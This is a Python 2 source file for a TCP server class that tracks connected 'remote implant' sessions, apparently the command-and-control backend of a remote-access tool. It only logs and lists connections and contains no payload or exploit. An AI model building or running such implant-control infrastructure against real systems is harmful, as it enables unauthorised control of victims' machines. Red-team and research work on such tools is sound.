import logging
import SocketServer

from .. network.handler import CrispyTCPServerHandler

logger = logging.getLogger(__name__)

class CrispyTCPServer(SocketServer.TCPServer):
    """ Backend server methods for clients. """

    def __init__(self, server_address, handler_class=CrispyTCPServerHandler):
        self.allow_reuse_address = True
        self.clients = []
        self.current_id = 1
        SocketServer.TCPServer.__init__(self, server_address, handler_class)
        return

    def serve_forever(self):
        logger.info('Handling requests, press <Ctrl-C> to quit')
        while True:
            self.handle_request()
        return

    def add_session(self, conn):
        """ Add remote implant to clients list. """
	logger.debug("add_session() was called")
        logger.info("Session {} opened ({}:{} <- {}:{})".format(self.current_id, 
								self.server_address[0], 
								self.server_address[1], 
								conn.desc["conn"].client_address[0],
								conn.desc["conn"].client_address[1]))
	self.clients.append(conn)
	self.current_id += 1
    
    def remove_session(self, conn):
        """ Remove remote implant from clients list. """
	logger.debug("remove_client() was called")
        self.clients.remove(conn)
	self.current_id -= 1
    
    def get_sessions_list(self):
        """ Return a list of sessions connected to the C2 server. """
	logger.debug("list_sessions() was called")
        return self.clients
